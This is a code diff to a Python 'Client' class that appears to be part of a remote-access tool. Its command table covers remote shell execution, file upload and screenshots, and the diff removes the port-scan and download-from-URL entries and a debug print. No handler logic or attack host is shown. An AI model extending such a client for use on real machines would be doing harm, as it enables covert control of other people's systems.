@@ -26,8 +26,6 @@ class Client():
         self.command_methods = {
             "file_upload": "execute_file_upload",
             "shell_exec": "execute_shell_command",
-            "port_scan": "execute_port_scan",
-            "dowmload_from_url": "execute_dowmload_from_url",
             "screenshot":"excute_screenshot"}
         
         
@@ -149,7 +147,6 @@ class Client():
                 break
             data += chunk
         try:
-            print("out")
             deserialized = json.loads(data.decode("utf-8"))
         except (TypeError, ValueError , json.decoder.JSONDecodeError) as e:
                 raise Exception('Data received was not in JSON format' + str(e))
